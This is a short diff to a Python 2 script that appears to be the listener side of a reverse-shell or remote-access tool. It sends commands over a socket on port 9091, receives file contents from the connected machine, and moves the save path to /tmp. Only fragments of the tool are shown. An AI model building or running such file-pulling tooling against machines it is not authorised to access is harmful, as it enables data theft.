@@ -6,7 +6,7 @@ import os
 def transfer(conn,command):
 
     conn.send(command)
-    f = open('/root/Desktop/file.txt') #Place where we saved a file
+    f = open('/tmp/file.txt') #Place where we saved a file
     while True:
         bits = conn.recv(1024)
         if 'Unable to find out the file' in bits:
@@ -49,3 +49,6 @@ except KeyboardInterrupt:
     print ''
     print '[-] Exiting... '
     SystemExit
+except socket.error:
+    print '[-] Port 9091 already in use....'
+    SystemExit()
